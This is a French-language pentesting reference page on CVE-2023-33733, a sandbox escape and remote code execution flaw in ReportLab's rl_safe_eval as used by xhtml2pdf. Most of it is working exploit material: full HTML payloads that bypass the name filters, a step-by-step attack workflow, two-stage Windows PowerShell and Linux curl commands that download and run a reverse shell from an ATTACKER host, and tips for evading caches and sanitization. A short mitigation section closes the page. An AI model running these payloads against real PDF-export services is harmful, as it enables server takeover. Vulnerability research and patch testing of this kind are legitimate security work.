# ReportLab/xhtml2pdf [[[...]]] expression-evaluation RCE (CVE-2023-33733)

{{#include ../../../banners/hacktricks-training.md}}

Cette page documente une escape pratique du sandbox et un primitive RCE dans rl_safe_eval de ReportLab utilisé par xhtml2pdf et d'autres pipelines de génération de PDF lorsqu'ils rendent du HTML contrôlé par l'utilisateur en PDF.

CVE-2023-33733 affecte les versions de ReportLab jusqu'à et y compris 3.6.12. Dans certains contextes d'attribut (par exemple color), les valeurs encadrées par triple crochets [[[ ... ]]] sont évaluées côté serveur par rl_safe_eval. En fabriquant un payload qui pivote depuis un builtin whitelisté (pow) vers ses globals de fonction Python, un attaquant peut atteindre le module os et exécuter des commandes.

Points clés
- Trigger : injecter [[[ ... ]]] dans des attributs évalués tels que <font color="..."> dans du markup analysé par ReportLab/xhtml2pdf.
- Sandbox : rl_safe_eval remplace les builtins dangereux mais les fonctions évaluées exposent toujours __globals__.
- Bypass : créer une classe transitoire Word pour contourner les vérifications de noms de rl_safe_eval et accéder à la chaîne "__globals__" tout en évitant le filtrage des dunder bloqués.
- RCE : getattr(pow, Word("__globals__"))["os"].system("<cmd>")
- Stabilité : Retourner une valeur valide pour l'attribut après exécution (pour color, utiliser 'red').

Quand tester
- Applications qui exposent une exportation HTML-to-PDF (profils, factures, rapports) et indiquent xhtml2pdf/ReportLab dans les métadonnées PDF ou les commentaires de la réponse HTTP.
- exiftool profile.pdf | egrep 'Producer|Title|Creator' → producteur "xhtml2pdf"
- La réponse HTTP pour un PDF commence souvent par un commentaire générateur ReportLab

Comment le bypass du sandbox fonctionne
- rl_safe_eval supprime ou remplace de nombreux builtins (getattr, type, pow, ...) et applique un filtrage de noms pour refuser les attributs commençant par __ ou figurant dans une denylist.
- Cependant, les fonctions safe vivent dans un dictionnaire globals accessible via func.__globals__.
- Utiliser type(type(1)) pour retrouver la vraie fonction builtin type (contournant le wrapper de ReportLab), puis définir une classe Word dérivée de str avec un comportement de comparaison muté de sorte que :
  - .startswith('__') → toujours False (contourne la vérification name startswith('__'))
  - .__eq__ retourne False uniquement à la première comparaison (contourne les vérifications d'appartenance à la denylist) et True ensuite (pour que Python getattr fonctionne)
  - .__hash__ égal à hash(str(self))
- Avec cela, getattr(pow, Word('__globals__')) retourne le dict globals de la fonction pow emballée, qui inclut un module os importé. Ensuite : ['os'].system('<cmd>').

Pattern d'exploitation minimal (exemple d'attribut)
Placer le payload à l'intérieur d'un attribut évalué et s'assurer qu'il retourne une valeur d'attribut valide via boolean et 'red'.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.10.10') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font></para>

- La forme en list-comprehension permet une unique expression acceptable par rl_safe_eval.
- Le trailing and 'red' retourne une couleur CSS valide pour que le rendu ne casse pas.
- Remplacer la commande selon le besoin ; utiliser ping pour valider l'exécution avec tcpdump.

Workflow opérationnel
1) Identifier le générateur de PDF
- Le PDF Producer indique xhtml2pdf ; la réponse HTTP contient un commentaire ReportLab.
2) Trouver une entrée reflétée dans le PDF (par ex., bio/description du profil) et déclencher une exportation.
3) Vérifier l'exécution avec un ICMP de faible bruit
- Run: sudo tcpdump -ni <iface> icmp
- Payload: ... system('ping <your_ip>') ...
- Windows envoie souvent exactement quatre requêtes echo par défaut.
4) Établir un shell
- Pour Windows, une approche two-stage fiable évite les problèmes de quoting/encoding :
- Stage 1 (download):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://ATTACKER/rev.ps1 -o rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Stage 2 (execute):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Pour les cibles Linux, un two-stage similaire avec curl/wget est possible :
- system('curl http://ATTACKER/s.sh -o /tmp/s; sh /tmp/s')

Notes et conseils
- Contextes d'attribut : color est un attribut connu évalué ; d'autres attributs dans le markup ReportLab peuvent aussi évaluer des expressions. Si un emplacement est sanitizé, essayer d'autres endroits rendus dans le flux PDF (champs différents, styles de table, etc.).
- Quoting : Garder les commandes compactes. Les downloads en two-stage réduisent drastiquement les problèmes de quoting et d'escaping.
- Fiabilité : Si les exportations sont mises en cache ou en file d'attente, varier légèrement le payload (par ex., chemin ou query aléatoire) pour éviter les caches.

Mitigations et détection
- Mettre à jour ReportLab vers 3.6.13 ou plus récent (CVE-2023-33733 corrigé). Suivre aussi les avis de sécurité dans les paquets de distribution.
- Ne pas fournir du HTML/markup contrôlé par l'utilisateur directement à xhtml2pdf/ReportLab sans une sanitization stricte. Supprimer/refuser les constructions d'évaluation [[[...]]] et les tags vendor-specific lorsque l'entrée n'est pas de confiance.
- Envisager de désactiver ou d'envelopper complètement l'utilisation de rl_safe_eval pour les entrées non fiables.
- Surveiller les connexions sortantes suspectes pendant la génération de PDF (par ex., ICMP/HTTP depuis les serveurs applicatifs lors d'exportations de documents).

References
- PoC and technical analysis: [c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
- 0xdf University HTB write-up (real-world exploitation, Windows two-stage payloads): [HTB: University](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- NVD entry (affected versions): [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- xhtml2pdf docs (markup/page concepts): [xhtml2pdf docs](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

{{#include ../../../banners/hacktricks-training.md}}
